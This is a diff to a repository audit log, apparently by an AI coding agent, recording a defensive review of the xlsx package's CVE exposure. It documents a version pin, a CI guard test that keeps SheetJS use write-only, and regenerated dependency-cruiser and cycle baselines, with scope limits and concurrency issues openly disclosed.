+(`135045ffe` 17:20:25 → `0f78f20e4` 17:29:08) and `tsc` exit 0 all observed this session.
+
+**Commit-collision note (not a rewrite).** The 12 deletions above were staged in this worktree and
+were then swept into a **concurrent workflow's** commit — `git show --stat 0f78f20e4` lists all 12
+deleted paths alongside that commit's own `PROOF_ALIGNMENT_LOG.md` additions, under the message
+"docs(audit): G3 localStorage credential map …". That workflow evidently staged everything in the
+shared worktree rather than its own paths. The deletions are therefore already in the branch and
+correct on disk; only their commit message is wrong. Not amended and not reverted-and-recommitted —
+history rewriting is off-limits under the repo's git rules, and re-deleting would produce a no-op
+diff. Recorded here so the sweep is attributable. `package.json`'s `xlsx` pin and
+`tests/xlsx-write-only-guard.test.ts` are that same workflow's in-flight work; they were explicitly
+unstaged and left alone.
+
+## 2026-08-18 — G4/H1 + H7: two stale config numbers — xlsx caret and the depcruise/cycles baselines (chore/w5-vettrack-residue)
+
+**Claim:** (H1) The council's demotion of `xlsx@^0.18.5` rests on a reachability argument
+that is only *half* sourced; the verdict survives but the basis is now split by evidence
+grade, pinned exactly, and enforced by a CI guard instead of prose. (H7) The
+dependency-cruiser baseline forgave 21 violations when only 10 exist; the madge cycle
+baseline listed a server cycle that was already resolved. Both regenerated.
+
+**Evidence — H1, reachability:**
+- `src/lib/export-excel.ts:30-40` — the only xlsx call sites: `utils.json_to_sheet`,
+  `utils.book_new`, `utils.book_append_sheet`, `writeFile`. All write-side. `xlsx` is
+  reached via `await import("xlsx")` (line 7), i.e. lazily.
+- `src/pages/equipment-list.tsx:96,489` — the sole caller. `:491` mentions `.xlsx` only as
+  a download *filename*, not an import.
+- Command: `rg -i xlsx` across the repo (excluding node_modules/dist/.claude/skills) →
+  one importer, one caller, one comment in `vite.config.ts:129`, two docs mentions.
+  No `XLSX.read`/`readFile`/`sheet_to_json` anywhere in `src/` or `server/`.
+- Command: `pnpm why xlsx` → `dependencies: xlsx 0.18.5`. Single direct production
+  dependency, **no transitive path** — nothing else in the tree pulls SheetJS in.
+- Probe: instrumented the real export path (proxying every public export, then running the
+  exact call sequence from `export-excel.ts`) →
+  `TOUCHED PUBLIC APIS: utils.book_append_sheet, utils.book_new, utils.json_to_sheet, write`
+  / `READ-PATH APIS TOUCHED: (none)`.
+
+**Evidence — H1, the two CVEs do NOT have equal support (this is the finding):**
+- **CVE-2023-30533 — advisory-exempted (strong).** `pnpm audit --json` returns the GHSA
+  overview verbatim: *"All versions of SheetJS CE through 0.19.2 are vulnerable to
+  'Prototype Pollution' when reading specially crafted files. Workflows that do not read
+  arbitrary files (for example, exporting data to spreadsheet files) are unaffected."*
+  Our workflow is named in the exemption. Verdict: not applicable.
+- **CVE-2024-22363 — empirically bounded, vendor silent (weaker).** The "read-path" claim
+  is **NOT** supported by any source I could reach:
+  - GHSA-5pgg-2g8v-p4x9 → *"SheetJS Community Edition before 0.20.2 is vulnerable.to
+    Regular Expression Denial of Service (ReDoS)."* No code path named.
+  - NVD CVE-2024-22363 → identical one-line text. No function named.
+  - Vendor `cdn.sheetjs.com/advisories/CVE-2024-22363` (fetched 200 via curl; WebFetch got
+    403) → summary + CVSS + affected-products only; defers to regexide.com. No code path.
+  Support for it is therefore *measurement*, not citation:
+  - Probe: 8 adversarial cell payloads (32k digit runs, nested-quantifier bait,
+    currency/scientific/cell-ref/XML-meta lookalikes) through the real write path →
+    baseline 5.9ms, then 1.7 / 1.3 / 1.2 / 1.3 / 1.1 ms. No super-linear backtracking.
+  - `node_modules/xlsx/xlsx.mjs:14884` — `if(cell.v.length > 32767) throw new Error("Text
+    length must not exceed 32767 characters")`. Two payloads *hit this cap and threw*,
+    which is itself the point: the write path structurally bounds the input to any regex.
+- **Correction to the council's wording:** "both CVEs are READ-path" overstates the record.
+  One is exempted by advisory text; the other is bounded by measurement while the vendor
+  declines to say. The demotion still holds — client-side, lazily-loaded, export-only, no
+  transitive exposure, hard input cap — but it is recorded at two different evidence grades.
+
+**Evidence — H1, the pin:**
+- Command: `npm view xlsx dist-tags` → `{"latest":"0.18.5"}`; `npm view xlsx versions` ends
+  at `0.18.5`. So `^0.18.5` on a 0.x (`>=0.18.5 <0.19.0`) is **inert** — it cannot resolve
+  anywhere. Pinning is *not* closing a live float; it removes a caret that advertises an
+  upgrade path which does not exist and never will (SheetJS left npm; patches are CDN-only).
+- `package.json:157` — `"xlsx": "^0.18.5"` → `"xlsx": "0.18.5"`.
+- `pnpm-lock.yaml:231` — `specifier: ^0.18.5` → `specifier: 0.18.5`. `version: 0.18.5` on
+  the next line is **unchanged**, so resolution is provably identical; the diff is one line.
+- **Hazard hit and avoided:** `node_modules` in this worktree is a **symlink to
+  `/Users/dan/vettrack/node_modules`** (`readlink` confirmed), shared with two other live
+  workflows. `pnpm install --lockfile-only` still prompted *"The modules directories will be
+  removed and reinstalled from scratch"* — it aborted, changing nothing (lockfile byte-identical,
+  `.pnpm` entry count 1417 before and after). The lockfile line was therefore edited surgically
+  instead, and validated in an isolated sandbox rather than in-place:
+  - RED: `pnpm install --frozen-lockfile --lockfile-only` in a temp dir with only the
+    manifests → `ERR_PNPM_OUTDATED_LOCKFILE`, failure reason names exactly one delta,
+    `"xlsx":"^0.18.5"` vs `"xlsx":"0.18.5"`.
+  - GREEN: same command after the one-line fix → `Done in 414ms`, exit 0.
+  This mattered: CI runs `pnpm install --frozen-lockfile` in **18 places**
+  (`.github/workflows/{ci,release-gate,playwright,flake-detection,...}.yml`), so leaving the
+  mismatch would have broken every workflow.
+
+**Evidence — H1, the guard (RED before GREEN, all three assertions):**
+- New file `tests/xlsx-write-only-guard.test.ts` — asserts (a) exactly one shipped importer
+  under `src/`+`server/`, (b) no SheetJS read API in it, (c) an exact pin in `package.json`.
+- RED 1 (pin): run against unpinned tree → `AssertionError: expected '^0.18.5' to match
+  /^\d+\.\d+\.\d+$/`.
+- RED 2 (read API): temporarily inserted `XLSX.utils.sheet_to_json(XLSX.read("x"))` into
+  `export-excel.ts` → `expected [ 'XLSX.read', 'sheet_to_json' ] to deeply equal []`.
+  Restored with `git checkout --` (not retyped); `git status --short` on that path → empty.
+- RED 3 (sole importer): temporarily added a second file importing xlsx →
+  `expected [ …(2) ] to deeply equal [ 'src/lib/export-excel.ts' ]`, listing the probe file.
+  Probe deleted; `git status --short` then showed only the new test as untracked.
+- GREEN: `pnpm test -- tests/xlsx-write-only-guard.test.ts` → `Test Files 1 passed (1) /
+  Tests 3 passed (3)`.
+- **Rejected alternatives, stated so this is a decision and not a default:** swapping to
+  `@e965/xlsx` (fork republishing patched SheetJS to npm) or to a write-only library changes
+  the bytes of a shipped user-facing export — feature-tier under
+  `.claude/rules/phase-delivery.md`, out of scope for a residue sweep. Vendoring the CDN
+  build adds an unauditable blob. Chosen: pin + document + CI-enforce the exemption.
+
+**Evidence — H7, depcruise baseline:**
+- RED: `.dependency-cruiser-known-violations.json` held **21** entries;
+  `pnpm depcruise:check` → `✔ no dependency violations found` + `‼ 10 known violations
+  ignored`. 11 forgiven that no longer exist.
+- **No-absorption proof (the reason this regeneration is not laundering):** the *pre*-regen
+  `pnpm depcruise:check` exited **0**, i.e. every live violation already matched a baseline
+  entry, so `--output-type baseline` had nothing new to absorb.
+- `pnpm depcruise:baseline` → 21 → **10** entries. 13 dropped, and 2 appeared. The 2 were
+  checked rather than waved through: `src/lib/realtime.ts -> src/lib/event-reducer.ts` and
+  `src/lib/sync-engine-telemetry.ts -> src/lib/api.ts` are **re-anchorings** of cycles that
+  are currently reported — depcruise records a cycle by its first edge, and the enumeration
+  start moved when 12 files were deleted from the tree mid-session.
+- Set-equality check against the cruiser's own JSON output:
+  `LIVE: 10` / `IN BASELINE BUT NOT LIVE (stale residue — must be 0): 0` /
+  `IN LIVE BUT NOT BASELINE (uncovered — must be 0): 0`. The baseline is now exactly the
+  live violation set.
+- Note (not acted on — ownership): 4 of the dropped entries involve `src/lib/api.ts`, owned
+  by the concurrent audit workflow. Regenerating the baseline does not touch that file, so
+  this stayed in lane; but if that workflow changes its imports, this baseline goes stale again.
+
+**Evidence — H7, cycles baseline:**
+- RED: `pnpm architecture:cycles` → `Resolved cycles in server (update baseline-cycles.json):
+  - jobs/definitions/index.ts > workers/chargeAlertWorker.ts > jobs/enqueue.ts`.
+  The comparator flags it itself.
+- Rotation trap avoided: the comparator *prints* the cycle normalized (rotated to the
+  lexicographically smallest node, `scripts/architecture/compare-cycles.mjs:16-32`) but
+  `docs/architecture/baseline-cycles.json` *stores* it unrotated as
+  `workers/chargeAlertWorker.ts > jobs/enqueue.ts > jobs/definitions/index.ts`. A literal
+  string match on the printed form finds nothing and would have deleted the wrong line.
+- GREEN: `pnpm architecture:cycles` → `OK — server: 2 cycle(s), src: 0 cycle(s) (matches
+  baseline).` with **no** "Resolved cycles" warning.
+
+**Evidence — gates:**
+- `pnpm architecture:gates` (the gate, not just the sub-command) → `[architecture-gates] All
+  G1 checks passed.` covering TypeScript frontend + server, dependency-cruiser
+  (`10 known violations ignored`), and the madge baseline.
+- `npx tsc --noEmit` → exit 0, no output.
+- `pnpm test -- tests/xlsx-write-only-guard.test.ts tests/phase-4-i18n-rtl-foundation.test.js
+  tests/shell-mobile-context-liveness-guard.test.ts` → `Test Files 3 passed (3) / Tests 11
+  passed (11)`.
+
+**NOT CLAIMED — full-suite green.** Unchanged from the prior entry in this worktree: the
+shared local Postgres is mid-migration under the concurrent RLS workflow and timer-window
+tests flake under three concurrent workflows, so `pnpm test` is not a usable signal here.
+Scope was held to the gates + typecheck + targeted tests above.
+
+**Concurrency disclosure.** HEAD moved **twice** underneath this session on this same branch
+(`135045ffe` → `0f78f20e4` → `34514e3e8`, both dead-code sweeps this task did not author),
+and the module count depcruise sees dropped 1013 → 1000 as a result. Every RED was therefore
+re-confirmed on the current tree before its GREEN, and the depcruise baseline was regenerated
+*after* the last of those commits. `git status --short` confirmed this session's four changes
+survived both.
+
+**Verdict:** VERIFIED for H7 (both baselines, tool-confirmed set equality and a clean gate).
+VERIFIED-WITH-CORRECTION for H1: the demotion stands, but the stated basis was half-sourced
+and is now recorded at two evidence grades, pinned, and CI-enforced.
+
+## 2026-08-18 — G4/H1 follow-up: the xlsx guard had two blind spots of its own (chore/w5-vettrack-residue)
+
+**Claim:** The guard committed in `1bfb9d64d` would have passed while a second xlsx
+importer shipped. Two scope holes, both found by attacking the guard rather than reading it,
+both closed and both proven by a failing run first.
+
+**Evidence:**
+- Hole 1 — **unscanned trees.** `SCANNED_TREES` was `["src", "server"]`. `scripts/`,
+  `shared/`, and `packages/` also ship (CI, ops, and workspace packages consumed by both
+  app halves) and were not scanned. Confirmed clean first —
+  `rg '(from|import\(|require\()\s*["'"'"']xlsx' scripts packages shared` → no matches —
+  so widening stays GREEN. Now `["src", "server", "scripts", "shared", "packages"]`.
+  - RED 6: temporary `packages/contracts/__redprobe.ts` importing xlsx →
+    `expected [ …(2) ] to deeply equal [ 'src/lib/export-excel.ts' ]`, listing the probe.
+    Before the widening this probe was invisible to the guard.
+- Hole 2 — **unscanned extension**, found only because RED 7 *failed to go red*. A probe at
+  `scripts/__redprobe.mjs` did **not** trip the widened guard, because `SOURCE_EXTENSIONS`
+  listed `.ts/.tsx/.js/.jsx/.mts/.cts` but not `.mjs`.
+  - Command: `find src server scripts shared packages -type f -name "*.*" | sed 's/.*\.//' |
+    sort | uniq -c | sort -rn` → `692 ts, 282 tsx, 15 sh, 11 mjs, ...`. `scripts/` is
+    predominantly `.mjs`, so this was an 11-file blind spot in a tree I had just added.
+  - Added `.mjs` + `.cjs`. RED 7 retry → `expected [ 'scripts/__redprobe.mjs', …(1) ] to
+    deeply equal [ 'src/lib/export-excel.ts' ]`.
+- `existsSync` early-return added to `listSourceFiles` so a future tree removal cannot turn
+  the guard into a hard crash.
+- `tests/` remains the one deliberate exclusion, now with the reason stated in the docblock:
+  this file itself contains the `READ_APIS` strings, so scanning `tests/` makes the guard
+  fail on itself.
+- GREEN: `pnpm test -- tests/xlsx-write-only-guard.test.ts` → `Test Files 1 passed (1) /
+  Tests 3 passed (3)`. `npx tsc --noEmit` → exit 0.
+- Both probes deleted; `git status --short` showed only the guard file modified.
+
+**Note on the H7 set-equality proof (not a defect, a precision caveat):** that check compares
+`(rule, from, to)` triples, and depcruise anchors a `no-circular` on its first edge, so two
+*different* cycles sharing a first edge would collapse to one triple. The conclusion is
+unaffected — it is independently supported by the count (10 live violations ↔ 10 entries),
+by the pre-regen exit-0 no-absorption proof, and by reading all ten full chains — but the
+triple comparison alone is not a bijection and should not be cited as if it were.
+
+**Verdict:** VERIFIED.
